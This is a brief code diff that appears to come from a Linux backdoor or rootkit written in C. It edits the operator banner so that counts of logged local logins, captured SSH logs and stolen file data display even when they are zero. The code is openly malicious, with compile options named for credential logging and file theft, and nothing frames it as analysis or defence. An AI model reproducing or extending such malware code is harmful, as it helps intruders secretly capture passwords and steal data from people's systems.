@@ -93,15 +93,15 @@ void bdprep(void){
         dorolf();
 #ifdef LOG_LOCAL_AUTH
         int authc = logcount(LOG_PATH);
-        if(authc>0) printf("\e[1mLogged accounts: \e[1;31m%d\e[0m\n", authc);
+        if(authc>=0) printf("\e[1mLogged accounts: \e[1;31m%d\e[0m\n", authc);
 #endif
 #ifdef LOG_SSH
         int sshc = logcount(SSH_LOGS);
-        if(sshc>0) printf("\e[1mSSH logs: \e[1;31m%d\e[0m\n", sshc);
+        if(sshc>=0) printf("\e[1mSSH logs: \e[1;31m%d\e[0m\n", sshc);
 #endif
 #ifdef FILE_STEAL
         off_t stolensize = getstolensize();
-        if(stolensize > 0){
+        if(stolensize >= 0){
             printf("\e[1mStolen data: ");
             if(stolensize >= 1024*1024)
                 printf("\e[1;31m%.2f\e[0m megabytes\n", (float)stolensize/(1024*1024));
